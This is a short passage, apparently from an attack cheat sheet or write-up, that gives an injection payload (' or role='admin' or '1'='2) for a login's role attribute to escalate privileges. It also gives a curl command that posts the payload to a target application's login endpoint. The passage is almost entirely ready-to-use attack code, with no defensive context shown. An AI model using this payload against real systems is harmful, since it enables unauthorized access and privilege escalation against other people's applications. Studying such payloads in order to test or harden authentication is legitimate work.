...
- **Payload:** 
  ```http
  ' or role='admin' or '1'='2
  ```
  Targets the role attribute to escalate privileges.

- **Command:**
  ```bash
  curl -X POST -d "username=attacker&password=' or role='admin' or '1'='2" http://target-app/login
  ```
